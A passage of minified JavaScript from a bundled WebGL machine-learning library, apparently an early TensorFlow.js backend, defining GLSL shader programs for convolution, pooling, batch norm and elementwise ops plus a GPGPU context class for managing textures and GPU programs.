avgMultiplier;\n          }\n        }\n        setOutput(dotProd);\n      }\n    "};n.AvgPool2DBackpropProgram=r},{}],65:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../../ops/broadcast_util"),i=function(t,e,n,i,o,s){this.outputShape=[],this.supportsBroadcasting=!0,this.variableNames=["x","mean","variance"],r.assertAndGetBroadcastShape(t,e),r.assertAndGetBroadcastShape(t,n);var a="0.0";null!=i&&(r.assertAndGetBroadcastShape(t,i),this.variableNames.push("offset"),a="getOffsetAtOutCoords()");var u="1.0";null!=o&&(r.assertAndGetBroadcastShape(t,o),this.variableNames.push("scale"),u="getScaleAtOutCoords()"),this.outputShape=t,this.userCode="\n      void main() {\n        float x = getXAtOutCoords();\n        float mean = getMeanAtOutCoords();\n        float variance = getVarianceAtOutCoords();\n        float offset = "+a+";\n        float scale = "+u+";\n        float inv = scale / sqrt(variance + float("+s+"));\n        setOutput((x - mean) * inv + offset);\n      }\n    "};n.BatchNormProgram=i},{"../../ops/broadcast_util":101}],66:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../../ops/broadcast_util"),i="\n  if (isNaN(a)) return a;\n  if (isNaN(b)) return b;\n";n.ADD="return a + b;",n.SUB="return a - b;",n.MUL="return a * b;",n.DIV="return a / b;",n.POW="\n  return (round(mod(b, 2.0)) == 0 || round(mod(b, 2.0)) == 2) ?\n      pow(abs(a), b) : sign(a) * pow(abs(a), b);\n",n.EQUAL=i+"\n  return float(a == b);\n",n.NOT_EQUAL=i+"\n  return float(a != b);\n",n.LESS=i+"\n  return float(a < b);\n",n.LESS_EQUAL=i+"\n  return float(a <= b);\n",n.GREATER=i+"\n  return float(a > b);\n",n.GREATER_EQUAL=i+"\n  return float(a >= b);\n",n.LOGICAL_AND=i+"\n  return float(a >= 1.0 && b >= 1.0);\n",n.LOGICAL_OR=i+"\n  return float(a >= 1.0 || b >= 1.0);\n",n.LOGICAL_XOR=i+"\n  return float(a >= 1.0 ^^ b >= 1.0);\n",n.PRELU="\n  return (a >= 0.0) ? a : b * a;\n",n.PRELU_DER="\n  return (a > 0.0) ? 1.0 : ((a < 0.0) ? b : a);\n",n.MAX=i+"\n  return max(a, b);\n",n.MIN=i+"\n  return min(a, b);\n";var o=function(t,e,n){this.variableNames=["A","B"],this.supportsBroadcasting=!0,this.outputShape=r.assertAndGetBroadcastShape(e,n),this.userCode="\n      float binaryOperation(float a, float b) {\n        "+t+"\n      }\n\n      void main() {\n        float a = getAAtOutCoords();\n        float b = getBAtOutCoords();\n        setOutput(binaryOperation(a, b));\n      }\n    "};n.BinaryOpProgram=o},{"../../ops/broadcast_util":101}],67:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t,e,n){this.variableNames=["A"],this.outputShape=t;var r=e.toFixed(20),i=n.toFixed(20);this.userCode="\n      void main() {\n        float value = getAAtOutCoords();\n        if (isNaN(value)) {\n          setOutput(value);\n          return;\n        }\n\n        setOutput(clamp(value, "+r+", "+i+"));\n      }\n    "};n.ClipProgram=r},{}],68:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../../ops/concat_util"),i=function(t,e){this.variableNames=["A","B"],this.outputShape=[],this.outputShape=r.computeOutShape(t,e,1),this.userCode="\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int yR = coords.x;\n        int yC = coords.y;\n\n        float value = 0.0;\n        if (yC < "+t[1]+") {\n          value = getA(yR, yC);\n        } else {\n          yC -= "+t[1]+";\n          value = getB(yR, yC);\n        }\n\n        setOutput(value);\n      }\n    "};n.ConcatProgram=i},{"../../ops/concat_util":104}],69:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t){this.variableNames=["x","dy"],this.outputShape=t.filterShape;var e=t.strideHeight,n=t.strideWidth,r=t.padInfo.top,i=t.padInfo.left;this.userCode="\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int wR = coords.x;\n        int wC = coords.y;\n        int d1 = coords.z;\n        int d2 = coords.w;\n\n        // Convolve x(?, ?, d1) with dy(:, :, d2) to get dw(wR, wC, d1, d2).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n\n        for (int b = 0; b < "+t.batchSize+"; b++) {\n          for (int yR = 0; yR < "+t.outHeight+"; yR++) {\n            int xR = wR + yR * "+e+" - "+r+";\n\n            if (xR < 0 || xR >= "+t.inHeight+") {\n              continue;\n            }\n\n            for (int yC = 0; yC < "+t.outWidth+"; yC++) {\n              int xC = wC + yC * "+n+" - "+i+";\n\n              if (xC < 0 || xC >= "+t.inWidth+") {\n                continue;\n              }\n\n              float dyValue = getDy(b, yR, yC, d2);\n              float xValue = getX(b, xR, xC, d1);\n              dotProd += (xValue * dyValue);\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    "};n.Conv2DDerFilterProgram=r;var i=function(t){this.variableNames=["dy","W"],this.outputShape=t.inShape;var e=t.filterHeight,n=t.filterWidth,r=t.strideHeight,i=t.strideWidth,o=e-1-t.padInfo.top,s=n-1-t.padInfo.left;this.userCode="\n      const ivec2 pads = ivec2("+o+", "+s+");\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords[0];\n        int d1 = coords[3];\n\n        ivec2 dyCorner = coords.yz - pads;\n        int dyRCorner = dyCorner.x;\n        int dyCCorner = dyCorner.y;\n\n        // Convolve dy(?, ?, d2) with w(:, :, d1, d2) to compute dx(xR, xC, d1).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        for (int wR = 0; wR < "+e+"; wR++) {\n          float dyR = float(dyRCorner + wR) / "+r+".0;\n\n          if (dyR < 0.0 || dyR >= "+t.outHeight+".0 || fract(dyR) > 0.0) {\n            continue;\n          }\n          int idyR = int(dyR);\n\n          int wRPerm = "+e+" - 1 - wR;\n\n          for (int wC = 0; wC < "+n+"; wC++) {\n            float dyC = float(dyCCorner + wC) / "+i+".0;\n\n            if (dyC < 0.0 || dyC >= "+t.outWidth+".0 ||\n                fract(dyC) > 0.0) {\n              continue;\n            }\n            int idyC = int(dyC);\n\n            int wCPerm = "+n+" - 1 - wC;\n\n            for (int d2 = 0; d2 < "+t.outChannels+"; d2++) {\n              float xValue = getDy(batch, idyR, idyC, d2);\n              float wValue = getW(wRPerm, wCPerm, d1, d2);\n              dotProd += xValue * wValue;\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    "};n.Conv2DDerInputProgram=i},{}],70:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t){this.variableNames=["x","W"],this.outputShape=t.outShape;var e=t.padInfo.top,n=t.padInfo.left,r=t.strideHeight,i=t.strideWidth,o=t.filterHeight,s=t.filterWidth,a=4*Math.floor(t.inChannels/4),u=t.inChannels%4;this.userCode="\n      const ivec2 strides = ivec2("+r+", "+i+");\n      const ivec2 pads = ivec2("+e+", "+n+");\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords[0];\n        int d2 = coords[3];\n\n        ivec2 xRCCorner = coords.yz * strides - pads;\n        int xRCorner = xRCCorner.x;\n        int xCCorner = xRCCorner.y;\n\n        // Convolve x(?, ?, d1) with w(:, :, d1, d2) to get y(yR, yC, d2).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        for (int wR = 0; wR < "+o+"; wR++) {\n          int xR = xRCorner + wR;\n\n          if (xR < 0 || xR >= "+t.inHeight+") {\n            continue;\n          }\n\n          for (int wC = 0; wC < "+s+"; wC++) {\n            int xC = xCCorner + wC;\n\n            if (xC < 0 || xC >= "+t.inWidth+") {\n              continue;\n            }\n\n            for (int d1 = 0; d1 < "+a+"; d1 += 4) {\n              vec4 xValues = vec4(\n                getX(batch, xR, xC, d1),\n                getX(batch, xR, xC, d1 + 1),\n                getX(batch, xR, xC, d1 + 2),\n                getX(batch, xR, xC, d1 + 3)\n              );\n              vec4 wValues = vec4(\n                getW(wR, wC, d1, d2),\n                getW(wR, wC, d1 + 1, d2),\n                getW(wR, wC, d1 + 2, d2),\n                getW(wR, wC, d1 + 3, d2)\n              );\n\n              dotProd += dot(xValues, wValues);\n            }\n\n            if ("+(1===u)+") {\n              dotProd +=\n                getX(batch, xR, xC, "+a+") *\n                getW(wR, wC, "+a+", d2);\n            } else if ("+(2===u)+") {\n              vec2 xValues = vec2(\n                getX(batch, xR, xC, "+a+"),\n                getX(batch, xR, xC, "+a+" + 1)\n              );\n              vec2 wValues = vec2(\n                getW(wR, wC, "+a+", d2),\n                getW(wR, wC, "+a+" + 1, d2)\n              );\n              dotProd += dot(xValues, wValues);\n            } else if ("+(3===u)+") {\n              vec3 xValues = vec3(\n                getX(batch, xR, xC, "+a+"),\n                getX(batch, xR, xC, "+a+" + 1),\n                getX(batch, xR, xC, "+a+" + 2)\n              );\n              vec3 wValues = vec3(\n                getW(wR, wC, "+a+", d2),\n                getW(wR, wC, "+a+" + 1, d2),\n                getW(wR, wC, "+a+" + 2, d2)\n              );\n              dotProd += dot(xValues, wValues);\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    "};n.Conv2DProgram=r},{}],71:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t){this.variableNames=["x","W"],this.outputShape=t.outShape;var e=t.inHeight,n=t.inWidth,r=t.padInfo.top,i=t.padInfo.left,o=t.strideHeight,s=t.strideWidth,a=t.filterHeight,u=t.filterWidth,c=t.outChannels/t.inChannels;this.userCode="\n      const ivec2 strides = ivec2("+o+", "+s+");\n      const ivec2 pads = ivec2("+r+", "+i+");\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords.x;\n        ivec2 xRCCorner = coords.yz * strides - pads;\n        int d2 = coords.w;\n        int d1 = d2 / "+c+";\n        int q = d2 - d1 * "+c+";\n\n        int xRCorner = xRCCorner.x;\n        int xCCorner = xRCCorner.y;\n\n        // Convolve x(?, ?, d1) with w(:, :, d1, q) to get y(yR, yC, d2).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        // TODO(dsmilkov): Flatten the two for loops and vec4 the operations.\n        for (int wR = 0; wR < "+a+"; wR++) {\n          int xR = xRCorner + wR;\n\n          if (xR < 0 || xR >= "+e+") {\n            continue;\n          }\n\n          for (int wC = 0; wC < "+u+"; wC++) {\n            int xC = xCCorner + wC;\n\n            if (xC < 0 || xC >= "+n+") {\n              continue;\n            }\n\n            float xVal = getX(batch, xR, xC, d1);\n            float wVal = getW(wR, wC, d1, q);\n            dotProd += xVal * wVal;\n          }\n        }\n        setOutput(dotProd);\n      }\n    "};n.DepthwiseConv2DProgram=r},{}],72:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t){this.variableNames=["A"];var e=t[0],n=t[1];this.outputShape=t,this.userCode="\n      void main() {\n        ivec3 coords = getOutputCoords();\n        int texR = coords[0];\n        int texC = coords[1];\n        int depth = coords[2];\n        vec2 uv = (vec2(texC, texR) + halfCR) / vec2("+n+".0, "+e+".0);\n\n        vec4 values = texture2D(A, uv);\n        float value;\n        if (depth == 0) {\n          value = values.r;\n        } else if (depth == 1) {\n          value = values.g;\n        } else if (depth == 2) {\n          value = values.b;\n        } else if (depth == 3) {\n          value = values.a;\n        }\n\n        setOutput(floor(value * 255.0 + 0.5));\n      }\n    "};n.FromPixelsProgram=r},{}],73:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./shader_compiler"),i=function(t,e,n){this.variableNames=["A","indices"];var i=t.slice();i[n]=e,this.outputShape=i,this.rank=i.length;var o=r.getCoordsDataType(this.rank),s=function(t,e){var n=t.length;if(n>4)throw Error("Gather for rank "+n+" is not yet supported");if(1===n)return"int(getIndices(resRC))";for(var r=["resRC.x","resRC.y","resRC.z","resRC.w"],i=[],o=0;o<t.length;o++)o===e?i.push("int(getIndices("+r[o]+"))"):i.push(""+r[o]);return i.join()}(t,n);this.userCode="\n      void main() {\n        "+o+" resRC = getOutputCoords();\n        setOutput(getA("+s+"));\n      }\n    "};n.GatherProgram=i},{"./shader_compiler":88}],74:[function(t,e,n){"use strict";var r=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},i=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../environment"),s=t("../../util"),a=t("./gpgpu_util"),u=t("./tex_util"),c=t("./webgl_util"),l=function(){function t(t){this.outputTexture=null,this.program=null,this.disposed=!1,this.autoDebugValidate=!1,this.firstProgram=!0,this.gl=null!=t?t:a.createWebGLContext(),1===o.ENV.get("WEBGL_VERSION")?(this.textureFloatExtension=c.getExtensionOrThrow(this.gl,"OES_texture_float"),this.colorBufferFloatExtension=this.gl.getExtension("WEBGL_color_buffer_float")):this.colorBufferFloatExtension=c.getExtensionOrThrow(this.gl,"EXT_color_buffer_float"),this.loseContextExtension=c.getExtensionOrThrow(this.gl,"WEBGL_lose_context"),o.ENV.get("WEBGL_GET_BUFFER_SUB_DATA_ASYNC_EXTENSION_ENABLED")&&(this.getBufferSubDataAsyncExtension=this.gl.getExtension("WEBGL_get_buffer_sub_data_async")),this.vertexBuffer=a.createVertexBuffer(this.gl),this.indexBuffer=a.createIndexBuffer(this.gl),this.framebuffer=c.createFramebuffer(this.gl)}return t.prototype.dispose=function(){var t=this;if(!this.disposed){null!=this.program&&console.warn("Disposing a GPGPUContext that still has a bound WebGLProgram. This is probably a resource leak, delete the program with GPGPUContext.deleteProgram before disposing."),null!=this.outputTexture&&console.warn("Disposing a GPGPUContext that still has a bound output matrix texture.  This is probably a resource leak, delete the output matrix texture with GPGPUContext.deleteMatrixTexture before disposing.");var e=this.gl;c.callAndCheck(e,(function(){return e.finish()})),c.callAndCheck(e,(function(){return e.bindFramebuffer(e.FRAMEBUFFER,null)})),c.callAndCheck(e,(function(){return e.deleteFramebuffer(t.framebuffer)})),c.callAndCheck(e,(function(){return e.bindBuffer(e.ARRAY_BUFFER,null)})),c.callAndCheck(e,(function(){return e.deleteBuffer(t.vertexBuffer)})),c.callAndCheck(e,(function(){return e.bindBuffer(e.ELEMENT_ARRAY_BUFFER,null)})),c.callAndCheck(e,(function(){return e.deleteBuffer(t.indexBuffer)})),this.loseContextExtension.loseContext(),this.disposed=!0}},t.prototype.enableAutomaticDebugValidation=function(t){this.autoDebugValidate=t,c.enableDebugWebGLErrorChecking(t)},t.prototype.createMatrixTexture=function(t,e){return this.throwIfDisposed(),a.createMatrixTexture(this.gl,t,e)},t.prototype.uploadPixelDataToTexture=function(t,e){this.throwIfDisposed(),a.uploadPixelDataToTexture(this.gl,t,e)},t.prototype.createPackedMatrixTexture=function(t,e){return this.throwIfDisposed(),a.createPackedMatrixTexture(this.gl,t,e)},t.prototype.deleteMatrixTexture=function(t){var e=this;this.throwIfDisposed(),this.outputTexture===t&&(c.unbindColorTextureFromFramebuffer(this.gl,this.framebuffer),this.outputTexture=null),c.callAndCheck(this.gl,(function(){return e.gl.deleteTexture(t)}))},t.prototype.uploadMatrixToTexture=function(t,e,n,r){this.throwIfDisposed();return a.uploadMatrixToTexture(this.gl,t,e,n,r,1)},t.prototype.uploadMatrixToPackedTexture=function(t,e,n,r){return this.throwIfDisposed(),a.uploadMatrixToPackedTexture(this.gl,t,e,n,r)},t.prototype.downloadMatrixFromTexture=function(t,e,n){var r=this;return this.downloadMatrixDriver(t,(function(){return a.downloadMatrixFromOutputTexture(r.gl,e,n)}))},t.prototype.downloadMatrixFromTextureAsync=function(t,e,n){return r(this,void 0,void 0,(function(){var r=this;return i(this,(function(i){if(null==this.getBufferSubDataAsyncExtension)throw new Error("Cannot download matrix from output texture asynchronously, WEBGL_get_buffer_sub_data_async is not enabled.");return[2,this.downloadMatrixDriverAsync(t,(function(){return a.downloadMatrixFromOutputTextureAsync(r.gl,r.getBufferSubDataAsyncExtension,e,n)}))]}))}))},t.prototype.downloadMatrixFromRGBAColorTexture=function(t,e,n,r){var i=this;return this.downloadMatrixDriver(t,(function(){return a.downloadMatrixFromRGBAColorTexture(i.gl,e,n,r)}))},t.prototype.downloadMatrixFromPackedTexture=function(t,e,n){var r=this;return this.downloadMatrixDriver(t,(function(){return a.downloadMatrixFromPackedOutputTexture(r.gl,e,n)}))},t.prototype.createProgram=function(t){this.throwIfDisposed();var e=this.gl,n=c.createFragmentShader(e,t),r=a.createVertexShader(e),i=c.createProgram(e);return c.callAndCheck(e,(function(){return e.attachShader(i,r)})),c.callAndCheck(e,(function(){return e.attachShader(i,n)})),c.linkProgram(e,i),this.autoDebugValidate&&c.validateProgram(e,i),this.firstProgram&&(this.firstProgram=!1,this.setProgram(i),a.bindVertexProgramAttributeStreams(e,this.program,this.vertexBuffer)),i},t.prototype.deleteProgram=function(t){var e=this;this.throwIfDisposed(),t===this.program&&(this.program=null),null!=t&&c.callAndCheck(this.gl,(function(){return e.gl.deleteProgram(t)}))},t.prototype.setProgram=function(t){var e=this;this.throwIfDisposed(),this.program=t,null!=this.program&&this.autoDebugValidate&&c.validateProgram(this.gl,this.program),c.callAndCheck(this.gl,(function(){return e.gl.useProgram(t)}))},t.prototype.getUniformLocation=function(t,e,n){return void 0===n&&(n=!0),this.throwIfDisposed(),n?c.getProgramUniformLocationOrThrow(this.gl,t,e):c.getProgramUniformLocation(this.gl,t,e)},t.prototype.getAttributeLocation=function(t,e){var n=this;return this.throwIfDisposed(),c.callAndCheck(this.gl,(function(){return n.gl.getAttribLocation(t,e)}))},t.prototype.getUniformLocationNoThrow=function(t,e){return this.throwIfDisposed(),this.gl.getUniformLocation(t,e)},t.prototype.setInputMatrixTexture=function(t,e,n){this.throwIfDisposed(),this.throwIfNoProgram(),c.bindTextureToProgramUniformSampler(this.gl,this.program,t,e,n)},t.prototype.setOutputMatrixTexture=function(t,e,n){this.setOutputMatrixTextureDriver(t,n,e)},t.prototype.setOutputPackedMatrixTexture=function(t,e,n){this.throwIfDisposed();var r=u.getPackedMatrixTextureShapeWidthHeight(e,n),i=r[0],o=r[1];this.setOutputMatrixTextureDriver(t,i,o)},t.prototype.setOutputMatrixWriteRegion=function(t,e,n,r){this.setOutputMatrixWriteRegionDriver(n,t,r,e)},t.prototype.setOutputPackedMatrixWriteRegion=function(t,e,n,r){throw new Error("setOutputPackedMatrixWriteRegion not implemented.")},t.prototype.debugValidate=function(){null!=this.program&&c.validateProgram(this.gl,this.program),c.validateFramebuffer(this.gl)},t.prototype.executeProgram=function(){this.throwIfDisposed(),this.throwIfNoProgram();var t=this.gl;this.autoDebugValidate&&this.debugValidate(),c.callAndCheck(t,(function(){return t.drawElements(t.TRIANGLES,6,t.UNSIGNED_SHORT,0)}))},t.prototype.blockUntilAllProgramsCompleted=function(){var t=this;this.throwIfDisposed(),c.callAndCheck(this.gl,(function(){return t.gl.finish()}))},t.prototype.getQueryTimerExtension=function(){return null==this.disjointQueryTimerExtension&&(this.disjointQueryTimerExtension=c.getExtensionOrThrow(this.gl,2===o.ENV.get("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")?"EXT_disjoint_timer_query_webgl2":"EXT_disjoint_timer_query")),this.disjointQueryTimerExtension},t.prototype.getQueryTimerExtensionWebGL2=function(){return this.getQueryTimerExtension()},t.prototype.getQueryTimerExtensionWebGL1=function(){return this.getQueryTimerExtension()},t.prototype.runQuery=function(t){var e=this.beginQuery();return t(),this.endQuery(),this.pollQueryTime(e)},t.prototype.beginQuery=function(){if(2===o.ENV.get("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")){var t=this.gl,e=this.getQueryTimerExtensionWebGL2(),n=t.createQuery();return t.beginQuery(e.TIME_ELAPSED_EXT,n),n}var r=this.getQueryTimerExtensionWebGL1(),i=r.createQueryEXT();return r.beginQueryEXT(r.TIME_ELAPSED_EXT,i),i},t.prototype.endQuery=function(){if(2!==o.ENV.get("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")){var t=this.getQueryTimerExtensionWebGL1();t.endQueryEXT(t.TIME_ELAPSED_EXT)}else{var e=this.gl,n=this.getQueryTimerExtensionWebGL2();e.endQuery(n.TIME_ELAPSED_EXT)}},t.prototype.isQueryAvailable=function(t,e){if(0===e)return!0;if(2===e){var n=this.gl,r=this.getQueryTimerExtensionWebGL2(),i=n.getQueryParameter(t,n.QUERY_RESULT_AVAILABLE),o=this.gl.getParameter(r.GPU_DISJOINT_EXT);return i&&!o}i=(r=this.getQueryTimerExtensionWebGL1()).getQueryObjectEXT(t,r.QUERY_RESULT_AVAILABLE_EXT),o=this.gl.getParameter(r.GPU_DISJOINT_EXT);return i&&!o},t.prototype.pollQueryTime=function(t){var e=this;return new Promise((function(n,r){var i=o.ENV.get("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION");s.repeatedTry((function(){return e.isQueryAvailable(t,i)})).then((function(){return n(e.getQueryTime(t,i))})).catch((function(){console.warn("Disjoint query timer never available."),n(-1)}))}))},t.prototype.getQueryTime=function(t,e){if(0===e)return null;if(2===e){var n=this.gl;return n.getQueryParameter(t,n.QUERY_RESULT)/1e6}var r=this.getQueryTimerExtensionWebGL1();return r.getQueryObjectEXT(t,r.QUERY_RESULT_EXT)/1e6},t.prototype.downloadMatrixDriverSetup=function(t){this.throwIfDisposed(),c.bindColorTextureToFramebuffer(this.gl,t,this.framebuffer),this.autoDebugValidate&&c.validateFramebuffer(this.gl)},t.prototype.downloadMatrixDriverTeardown=function(){null!=this.outputTexture?(c.bindColorTextureToFramebuffer(this.gl,this.outputTexture,this.framebuffer),this.autoDebugValidate&&c.validateFramebuffer(this.gl)):c.unbindColorTextureFromFramebuffer(this.gl,this.framebuffer)},t.prototype.downloadMatrixDriver=function(t,e){this.downloadMatrixDriverSetup(t);var n=e();return this.downloadMatrixDriverTeardown(),n},t.prototype.downloadMatrixDriverAsync=function(t,e){return r(this,void 0,void 0,(function(){var n;return i(this,(function(r){switch(r.label){case 0:return this.downloadMatrixDriverSetup(t),[4,e()];case 1:return n=r.sent(),this.downloadMatrixDriverTeardown(),[2,n]}}))}))},t.prototype.setOutputMatrixTextureDriver=function(t,e,n){this.throwIfDisposed();var r=this.gl;c.bindColorTextureToFramebuffer(r,t,this.framebuffer),this.autoDebugValidate&&c.validateFramebuffer(r),this.outputTexture=t,c.callAndCheck(r,(function(){return r.viewport(0,0,e,n)})),c.callAndCheck(r,(function(){return r.scissor(0,0,e,n)}))},t.prototype.setOutputMatrixWriteRegionDriver=function(t,e,n,r){var i=this;this.throwIfDisposed(),c.callAndCheck(this.gl,(function(){return i.gl.scissor(t,e,n,r)}))},t.prototype.throwIfDisposed=function(){if(this.disposed)throw new Error("Attempted to use disposed GPGPUContext.")},t.prototype.throwIfNoProgram=function(){if(null==this.program)throw new Error("No GPU program is currently set.")},t}();n.GPGPUContext=l},{"../../environment":27,"../../util":143,"./gpgpu_util":76,"./tex_util":90,"./webgl_util":95}],75:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../../environment"),i=t("../../util"),o=t("./shader_compiler"),s="NaN";function a(){return!r.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")}function u(t,e){if(t.length!==e.length)throw Error("Binary was compiled with "+t.length+" inputs, but was executed with "+e.length+" inputs");t.forEach((function(t,n){var r=t.logicalShape,o=t.texShape,s=e[n].tensor.shape,a=e[n].texData.texShape;if(!i.arraysEqual(r,s))throw Error("Binary was compiled with different shapes than the current args. Shapes "+r+" and "+s+" must match");if(!i.arraysEqual(o,a))throw Error("Binary was compiled with different texture shapes than the current args. Shape "+o+" and "+a+" must match")}))}n.compileProgram=function(t,e,n,r){for(var i=e.userCode,u=n.map((function(t,n){var r={logicalShape:t.tensor.shape,texShape:t.texData.texShape};return{name:e.variableNames[n],shapeInfo:r}})),c=u.map((function(t){return t.shapeInfo})),l={logicalShape:r.tensor.shape,texShape:r.texData.texShape},h=o.makeShader(u,l,i,!0===e.supportsBroadcasting),p=t.createProgram(h),d={},f=0;f<e.variableNames.length;f++){var y=e.variableNames[f];d[y]=t.getUniformLocation(p,y)}if(a()){d.NaN=t.getUniformLocation(p,s,!1)}return{program:e,source:h,webGLProgram:p,uniformLocations:d,gpgpu:t,inShapeInfos:c,outShapeInfo:l}},n.runProgram=function(t,e,n,r){u(t.inShapeInfos,e),u([t.outShapeInfo],[n]);var i=n.texData.texture,o=n.texData.texShape,s=t.gpgpu;s.setOutputMatrixTexture(i,o[0],o[1]),s.setProgram(t.webGLProgram),e.forEach((function(e,n){var r=e.texData.texture,i=t.program.variableNames[n],o=t.uniformLocations[i];s.setInputMatrixTexture(r,o,n)})),a()&&s.gl.uniform1f(t.uniformLocations.NaN,NaN),null!=r&&r(s,t.webGLProgram),s.executeProgram()},n.makeShaderKey=function(t,e,n){var r="";e.concat(n).forEach((function(t){r+=t.tensor.shape+"_"+t.texData.texShape}));var i=t.userCode,o=(!0===t.supportsBroadcasting).toString(),s=t.constructor.name;return s+="_"+o+"_"+r+"_"+i}},{"../../environment":27,"../../util":143,"./shader_compiler":88}],76:[function(t,e,n){"use strict";var r=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},i=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../environment"),s=t("./tex_util"),a=t("./webgl_util");function u(){return{alpha:!1,antialias:!1,premultipliedAlpha:!1,preserveDrawingBuffer:!1,depth:!1,stencil:!1,failIfMajorPerformanceCaveat:!0}}function c(t,e){return o.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")&&2===o.ENV.get("WEBGL_VERSION")?4===e?t.RGBA:t.RED:t.RGBA}function l(t){return o.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")?t.FLOAT:t.UNSIGNED_BYTE}function h(t,e,n,r){a.validateTextureSize(t,e,n);var i=a.createTexture(t),s=t.TEXTURE_2D,u=function(t,e){return o.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")&&2===o.ENV.get("WEBGL_VERSION")?4===e?t.RGBA32F:t.R32F:t.RGBA}(t,r),h=c(t,r);return a.callAndCheck(t,(function(){return t.bindTexture(s,i)})),a.callAndCheck(t,(function(){return t.texParameteri(s,t.TEXTURE_WRAP_S,t.CLAMP_TO_EDGE)})),a.callAndCheck(t,(function(){return t.texParameteri(s,t.TEXTURE_WRAP_T,t.CLAMP_TO_EDGE)})),a.callAndCheck(t,(function(){return t.texParameteri(s,t.TEXTURE_MIN_FILTER,t.NEAREST)})),a.callAndCheck(t,(function(){return t.texParameteri(s,t.TEXTURE_MAG_FILTER,t.NEAREST)})),a.callAndCheck(t,(function(){return t.texImage2D(s,0,u,e,n,0,h,l(t),null)})),a.callAndCheck(t,(function(){return t.bindTexture(t.TEXTURE_2D,null)})),i}function p(t,e,n,r,i,o){var 